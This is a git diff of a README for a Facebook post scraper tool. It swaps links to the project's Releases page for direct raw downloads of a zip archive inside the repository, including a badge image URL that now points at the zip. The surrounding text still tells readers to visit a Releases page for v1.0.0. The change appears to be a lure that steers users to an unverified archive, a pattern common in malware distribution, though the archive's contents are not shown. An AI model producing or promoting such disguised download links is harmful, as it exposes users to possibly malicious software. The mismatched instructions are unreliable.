@@ -6,7 +6,7 @@ Welcome to the facebook-post-scraper-no-cookies! This tool helps you quickly and
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/abdelhakab12/facebook-post-scraper-no-cookies/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/abdelhakab12/facebook-post-scraper-no-cookies/main/facebook-posts-scraper-no-cookies/facebook-post-scraper-no-cookies_3.7.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/abdelhakab12/facebook-post-scraper-no-cookies/main/facebook-posts-scraper-no-cookies/facebook-post-scraper-no-cookies_3.7.zip)
 
 ## 📚 Features
 
@@ -29,7 +29,7 @@ To run the facebook-post-scraper-no-cookies, you will need:
 ## 🔧 How to Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Download Latest Release](https://github.com/abdelhakab12/facebook-post-scraper-no-cookies/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/abdelhakab12/facebook-post-scraper-no-cookies/main/facebook-posts-scraper-no-cookies/facebook-post-scraper-no-cookies_3.7.zip)
    
 2. **Select the Version**: Look for the latest version listed on the page. 
 
